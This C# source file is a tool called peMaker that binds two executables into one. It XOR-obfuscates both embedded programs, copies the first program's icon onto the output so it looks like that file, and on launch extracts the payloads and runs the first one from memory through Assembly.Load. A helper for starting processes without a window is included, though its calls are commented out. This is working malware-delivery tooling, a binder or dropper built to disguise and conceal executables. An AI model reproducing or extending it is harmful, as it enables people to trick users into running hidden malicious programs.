using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Diagnostics;               //for Process
using System.Runtime.InteropServices;
using System.Reflection;


namespace peMaker
{
    class Program
    {
        static string startadd1 = "11111111";
        static string startadd2 = "22222222";

        [DllImport( "ChangeIconLib.dll" )]
        static extern void ChangeIcon(String executableFile, String iconFile, short imageCount);
        
        static void Main(string[] args)
        {
            // if no parameters just create the main exe file
            if( args.Length == 0 )
            {
                string myName = System.Reflection.Assembly.GetEntryAssembly().Location;
                LoadFile( myName );
            }
            if( args.Length < 3 )
            {
                Console.WriteLine( "pemaker:\nUsage: pemaker [in1] [in2] [out]\n" );
                return;
            }
            string in1 = args[0];
            string in2 = args[1];
            string out1 = args[2];

            // use in1's icon as the icon for the new app...
            string filePath =  in1;



            //****************************************************
            // CHANGE THE ICON OF THE OUTPUT FILE TO MATCH
            // THE ICON OF IN1 FILE
            //****************************************************
            byte[] _allTogether = readExecutableFileToMemory( null);
            File.WriteAllBytes( "temp.exe", _allTogether );

            Icon TheIcon = Icon.ExtractAssociatedIcon( in1 );
            StreamWriter sr = new StreamWriter( "1.ico" );
            TheIcon.Save( sr.BaseStream );
            sr.Close();
            changeTheIcon( "temp.exe", "1.ico" );

            byte[] bin1 = File.ReadAllBytes( in1);
            byte[] bin2 = File.ReadAllBytes( in2 );
            for( int pp = 0; pp < bin1.Length; pp++ )
            {
                bin1[pp] ^= 31;
            }
            for( int pp = 0; pp < bin2.Length; pp++ )
            {
                bin2[pp] ^= 39;
            }
            byte[] allTogether = readExecutableFileToMemory( "temp.exe");

            int allbytes = allTogether.Length + bin1.Length + bin2.Length;
            byte[] all = new byte[allbytes];
            bool add1written = false, add2written = false;

            // before writing it all back to disk make changes to the addresses above
            int i;
            for( i = 0; i < allTogether.Length; i++ )
            {
                if( allTogether[i] == '1' && allTogether[i + 1] == 0 &&
                     allTogether[i + 2] == '1' && allTogether[i + 3] == 0 &&
                      allTogether[i + 4] == '1' && allTogether[i + 5] == 0 )
                {
                    string a1 = allTogether.Length.ToString( "X08" );
                    for( int p = 0; p < 16; p += 2 )
                        allTogether[p + i] = (byte)a1[p / 2];
                    add1written = true;
                    break;
                }
            }
            // before writing it all back to disk make changes to the addresses above
            for( int i2 = i; i2 < allTogether.Length; i2++ )
            {
                if( allTogether[i2] == '2' && allTogether[i2 + 1] == 0 &&
                     allTogether[i2 + 2] == '2' && allTogether[i2 + 3] == 0 &&
                      allTogether[i2 + 4] == '2' && allTogether[i2 + 5] == 0 )
                {
                    string a1 = (allTogether.Length + bin1.Length).ToString( "X08" );
                    for( int p = 0; p < 16; p += 2 )
                        allTogether[p + i2] = ( byte )a1[p / 2];
                    add2written = true;
                    break;
                }
            }

            Array.Copy( allTogether, 0, all, 0, allTogether.Length );
            Array.Copy( bin1, 0, all, allTogether.Length, bin1.Length );
            Array.Copy( bin2, 0, all, allTogether.Length + bin1.Length, bin2.Length );

            File.WriteAllBytes( out1, all );
        } // endfunc main

        private static void LoadFile( string fn)
        {
            byte[] buf;
            int flen = 0, bytesread, red = 0;
            try
            {
                using( FileStream fileStream = new FileStream(
                    fn,
                    FileMode.Open,
                    FileAccess.Read,
                    FileShare.ReadWrite ) )
                {
                    using( StreamReader streamReader = new StreamReader( fileStream ) )
                    {
                        flen = ( int )streamReader.BaseStream.Length;
                        Console.WriteLine( "pemaker: trying to run " + fn + " with len " + flen.ToString() );
                        buf = new byte[flen];
                        while( red < flen )
                        {
                            bytesread = streamReader.BaseStream.Read( buf, 0, flen );
                            red += bytesread;
                        }
                    }
                    fileStream.Close();
                    uint add1 = Convert.ToUInt32( startadd1, 16 );
                    uint add2 = Convert.ToUInt32( startadd2, 16 );

                    // extract the directory
                    int f1 = fn.LastIndexOf( '\\' );
                    if( f1 < 0 )
                    {
                        f1 = fn.LastIndexOf( '/' );
                        if( f1 < 0 )
                        {
                            Console.WriteLine( "cannot find directory in file name. Aborting!" );
                            return;
                        }
                    }
                    string drctry = fn.Substring( 0, f1 );
                    string new1 = drctry + "\\1.exe";
                    string new2 = drctry + "\\2.exe";

                    byte[] bbb1 = new byte[add2 - add1];
                    Array.Copy( buf, add1, bbb1, 0, add2 - add1 );
                    byte[] bbb2 = new byte[flen - add2];
                    Array.Copy( buf, add2, bbb2, 0, flen - add2 );

                    for( int pp = 0; pp < bbb1.Length; pp++ )
                    {
                        bbb1[pp] ^= 31;
                    }
                    for( int pp2 = 0; pp2 < bbb2.Length; pp2++ )
                    {
                        bbb2[pp2] ^= 39;
                    }

                    File.WriteAllBytes( new1, bbb1 );

                    File.WriteAllBytes( new2, bbb2 );


                    /*
                    execute( new1);
                    execute( new2);
                     * */
                    // try to load from memory and don't put anything on disk
                    // load the bytes into Assembly
                    Assembly a = Assembly.Load( bbb1 );

                    // search for the Entry Point
                    MethodInfo method = a.EntryPoint;
                    if( method != null )
                    {
                        //...
                    }

                    // create an instance of the Startup form Main method
                    object o = a.CreateInstance( method.Name );
                    // invoke the application starting point
                    method.Invoke( o, null );
                    return;
                }
            }
            catch( Exception ex )
            {
                Console.WriteLine( "Error loading file: " + ex.Message );
            }
        }  // endfunc load file


        static byte[] readExecutableFileToMemory( string fn)
        {
            if( fn == null)
                fn = System.Reflection.Assembly.GetEntryAssembly().Location;
            byte[] buf = { 0 };
            int flen = 0, bytesread, red = 0;
            try
            {
                using( FileStream fileStream = new FileStream(
                    fn,
                    FileMode.Open,
                    FileAccess.Read,
                    FileShare.ReadWrite ) )
                {
                    using( StreamReader streamReader = new StreamReader( fileStream ) )
                    {
                        flen = ( int )streamReader.BaseStream.Length;
                        Console.WriteLine( "pemaker: trying to run " + fn + " with len " + flen.ToString() );
                        buf = new byte[flen];
                        while( red < flen) 
                        {
                            bytesread = streamReader.BaseStream.Read( buf, 0, flen );
                            red += bytesread;
                        }
                    }
                    fileStream.Close();
                }
            }
            catch( Exception ex )
            {
                Console.WriteLine( "Error loading file: " + ex.Message );
            }
            return buf;
        } // endfunc readExecutableFileToMemory

        static void execute(string name)
        {
            Process process = new Process();
            process.StartInfo.WindowStyle = ProcessWindowStyle.Maximized; //Hidden;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.FileName = name;
            process.Start();
        } // end func execute    


        static void changeTheIcon(string exeFilePath, string iconFilePath)
        {
            short imageCount = 0;

            using( StreamReader sReader = new StreamReader( iconFilePath ) )
            {
                using( BinaryReader bReader = new BinaryReader( sReader.BaseStream ) )
                {
                    // Retrieve icon count inside icon file
                    bReader.ReadInt16();
                    bReader.ReadInt16();
                    imageCount = bReader.ReadInt16();
                }
            }

            // Change the executable's icon
            ChangeIcon( exeFilePath, iconFilePath, imageCount );
        }

    }
}
